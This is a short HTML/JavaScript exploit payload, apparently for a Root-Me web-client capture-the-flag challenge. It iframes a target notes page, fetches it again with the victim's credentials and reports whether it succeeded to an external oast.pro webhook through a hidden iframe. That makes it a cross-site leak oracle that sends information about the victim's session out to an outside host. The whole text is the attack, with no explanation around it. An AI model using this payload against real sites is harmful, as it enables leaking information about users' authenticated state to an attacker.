<script>
const TARGET = "https://web-client-ch56.challenge01.root-me.org:58056/notes/1376";
const WEBHOOK = "https://525146614d396f3af709gux4rbeyyyyyb.oast.pro";

window.onload = function () {
    const iframe = document.createElement("iframe");
    iframe.onload = function () {
        fetch(TARGET, { method: 'HEAD', credentials: 'include' })
            .then(response => {
                const ex = document.createElement("iframe");
                ex.src = WEBHOOK + "?hit=" + response.ok;
                ex.style.display = "none";
                document.body.appendChild(ex);
            })
            .catch(() => {
                const ex = document.createElement("iframe");
                ex.src = WEBHOOK + "?hit=false";
                ex.style.display = "none";
                document.body.appendChild(ex);
            });
    };
    iframe.src = TARGET;
    document.body.appendChild(iframe);
};
</script>
